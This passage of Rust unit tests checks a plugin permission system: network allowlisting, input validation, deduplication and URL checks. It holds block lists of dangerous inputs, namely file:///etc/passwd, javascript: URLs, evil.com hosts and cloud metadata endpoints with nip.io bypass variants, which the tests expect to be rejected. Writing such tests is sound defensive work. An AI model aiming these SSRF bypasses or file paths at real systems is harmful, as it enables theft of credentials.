        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let safe_domains = vec![
            "api.github.com",
            "registry.npmjs.org",
            "deno.land",
            "crates.io",
            "docker.io",
            "gcr.io",
            "my-company.com",
            "example.org",
        ];

        for domain in &safe_domains {
            permissions.allow_network(domain);
        }

        // All safe domains should be added
        assert_eq!(permissions.network.len(), safe_domains.len());

        for domain in safe_domains {
            assert!(
                permissions.network.contains(&domain.to_string()),
                "Safe domain '{}' should be allowed",
                domain
            );
        }
    }

    #[test]
    fn test_empty_and_whitespace_validation() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let initial_read_count = permissions.file_read.len();
        let initial_write_count = permissions.file_write.len();
        let initial_network_count = permissions.network.len();
        let initial_run_count = permissions.run_commands.len();

        // Test empty strings
        permissions.allow_read("");
        permissions.allow_write("");
        permissions.allow_network("");
        permissions.allow_run("");

        // Test whitespace-only strings
        permissions.allow_read("   ");
        permissions.allow_write("\t\n");
        permissions.allow_network("  \t  ");
        permissions.allow_run("\n\r\t");

        // Counts should not change
        assert_eq!(permissions.file_read.len(), initial_read_count);
        assert_eq!(permissions.file_write.len(), initial_write_count);
        assert_eq!(permissions.network.len(), initial_network_count);
        assert_eq!(permissions.run_commands.len(), initial_run_count);
    }

    #[test]
    fn test_deduplication_works() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Add the same safe command multiple times
        permissions.allow_run("git");
        permissions.allow_run("git");
        permissions.allow_run("git");

        // Should only appear once
        assert_eq!(permissions.run_commands.len(), 1);
        assert_eq!(permissions.run_commands[0], "git");

        // Add same safe path multiple times
        let initial_read_count = permissions.file_read.len();
        permissions.allow_read("./config");
        permissions.allow_read("./config");
        permissions.allow_read("./config");

        // Should only appear once (in addition to defaults)
        // Note: safe_defaults already includes project_root and .makeitso paths
        assert_eq!(permissions.file_read.len(), initial_read_count + 1);

        // Verify the config path was added only once
        let config_count = permissions
            .file_read
            .iter()
            .filter(|&path| path == "./config")
            .count();
        assert_eq!(config_count, 1, "Config path should appear exactly once");
    }

    #[test]
    fn test_command_specific_permissions_extend_plugin_permissions() {
        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        // Plugin allows git
        let plugin_permissions = SecurityPermissions {
            run_commands: vec!["git".to_string()],
            ..Default::default()
        };

        // Command allows git + docker (should result in both)
        let command_permissions = SecurityPermissions {
            run_commands: vec!["git".to_string(), "docker".to_string()],
            ..Default::default()
        };

        let mut commands = HashMap::new();
        commands.insert(
            "deploy".to_string(),
            PluginCommand {
                script: "./deploy.ts".to_string(),
                description: None,
                instructions: None,
                args: None,
                permissions: Some(command_permissions),
            },
        );

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands,
            deno_dependencies: HashMap::new(),
            permissions: Some(plugin_permissions),
        };

        let result = build_plugin_permissions(&project_root, &manifest, "deploy");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should have both git and docker (git from plugin + both from command)
        // Deduplication should prevent git appearing twice
        assert_eq!(permissions.run_commands.len(), 2);
        assert!(permissions.run_commands.contains(&"git".to_string()));
        assert!(permissions.run_commands.contains(&"docker".to_string()));
    }

    #[test]
    fn test_malformed_toml_permissions() {
        // Test various malformed permission configurations
        let malformed_configs = vec![
            // Wrong type - string instead of array
            r#"
[plugin]
name = "test"
version = "1.0.0"

[permissions]
run_commands = "git"  # Should be ["git"]

[commands.test]
script = "./test.ts"
"#,
            // Wrong type - number instead of array
            r#"
[plugin]
name = "test"
version = "1.0.0"

[permissions]
run_commands = 123

[commands.test]
script = "./test.ts"
"#,
            // Mixed types in array
            r#"
[plugin]
name = "test"
version = "1.0.0"

[permissions]
run_commands = ["git", 123, true]

[commands.test]
script = "./test.ts"
"#,
        ];

        for config in malformed_configs {
            let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(config);
            // These should either fail to parse or parse with empty/default permissions
            if let Ok(manifest) = parsed {
                // If it parses, permissions should be None or empty
                if let Some(perms) = manifest.permissions {
                    // If permissions exist, run_commands should be empty (failed to parse array)
                    assert!(
                        perms.run_commands.is_empty()
                            || perms.run_commands.iter().all(|s| !s.is_empty())
                    );
                }
            }
            // If it fails to parse, that's also acceptable behavior
        }
    }

    #[test]
    fn test_nonexistent_command_permissions() {
        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let plugin_permissions = SecurityPermissions {
            run_commands: vec!["git".to_string()],
            ..Default::default()
        };

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands: HashMap::new(), // No commands defined
            deno_dependencies: HashMap::new(),
            permissions: Some(plugin_permissions),
        };

        // Try to build permissions for nonexistent command
        let result = build_plugin_permissions(&project_root, &manifest, "nonexistent");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should still have plugin-level permissions
        assert_eq!(permissions.run_commands, vec!["git"]);
    }

    #[test]
    fn test_url_validation_comprehensive() {
        // Test registry URL validation
        let dangerous_registry_urls = vec![
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/plain,evil",
            "http://localhost/repo",
            "http://127.0.0.1/repo",
            "http://192.168.1.1/repo",
            "http://169.254.169.254/metadata",
            "ftp://evil.com/repo",
        ];

        for url in dangerous_registry_urls {
            let result = validate_registry_url(url);
            assert!(
                result.is_err(),
                "Dangerous registry URL should be rejected: {}",
                url
            );
        }

        let safe_registry_urls = vec![
            "https://github.com/user/repo.git",
            "git@github.com:user/repo.git",
            "https://gitlab.com/user/repo.git",
            "ssh://git@github.com/user/repo.git",
        ];

        for url in safe_registry_urls {
            let result = validate_registry_url(url);
            assert!(
                result.is_ok(),
                "Safe registry URL should be accepted: {}",
                url
            );
        }

        // Test dependency URL validation
        let dangerous_dep_urls = vec![
            "file:///etc/passwd",
            "http://deno.land/x/evil", // HTTP not allowed for deps
            "javascript:evil()",
            "ftp://evil.com/lib.ts",
            "http://localhost:8080/lib.ts",
        ];

        for url in dangerous_dep_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_err(),
                "Dangerous dependency URL should be rejected: {}",
                url
            );
        }

        let safe_dep_urls = vec![
            "https://deno.land/x/oak@v12.6.1/mod.ts",
            "https://esm.sh/react@18.2.0",
            "https://cdn.skypack.dev/lodash",
            "https://raw.githubusercontent.com/user/repo/main/lib.ts",
        ];

        for url in safe_dep_urls {
            let result = validate_deno_dependency_url(url);
            assert!(
                result.is_ok(),
                "Safe dependency URL should be accepted: {}",
                url
            );
        }
    }

    #[test]
    fn test_domain_normalization() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Test case normalization
        permissions.allow_network("API.GITHUB.COM");
        permissions.allow_network("api.github.com");
        permissions.allow_network("Api.GitHub.Com");

        // Should only appear once due to normalization and deduplication
        assert_eq!(permissions.network.len(), 1);
        assert_eq!(permissions.network[0], "api.github.com");

        // Test whitespace trimming
        let mut permissions2 = PluginPermissions::safe_defaults(&project_root);
        permissions2.allow_network("  registry.npmjs.org  ");
        permissions2.allow_network("registry.npmjs.org");

        assert_eq!(permissions2.network.len(), 1);
        assert_eq!(permissions2.network[0], "registry.npmjs.org");
    }

    #[test]
    fn test_comprehensive_metadata_service_blocking() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let metadata_services = vec![
            // AWS
            "169.254.169.254",
            "instance-data.ec2.internal",
            // Google Cloud
            "100.100.100.200",
            "metadata.google.internal",
            // Azure
            "metadata.azure.com",
            // Bypass attempts
            "169.254.169.254.nip.io",
            "169.254.169.254.xip.io",
            "169-254-169-254.nip.io",
            "metadata",
            "metadata.local",
            // Case variations (should be normalized and blocked)
            "METADATA.GOOGLE.INTERNAL",
            "  169.254.169.254  ", // With whitespace
        ];

        let initial_count = permissions.network.len();

        for service in metadata_services {
            permissions.allow_network(service);

            assert_eq!(
                permissions.network.len(),
                initial_count,
                "Metadata service '{}' should be blocked",
                service
            );
        }
    }

    #[test]
    fn test_case_insensitive_dangerous_domain_blocking() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let case_variations = vec![
            "LOCALHOST",
            "LocalHost",
            "127.0.0.1",
            "192.168.1.1",
            "METADATA.GOOGLE.INTERNAL",
            "Metadata.Azure.Com",
        ];

        let initial_count = permissions.network.len();

        for domain in case_variations {
            permissions.allow_network(domain);

            assert_eq!(
                permissions.network.len(),
                initial_count,
                "Case variation '{}' should be blocked",
                domain
            );
        }
    }
}
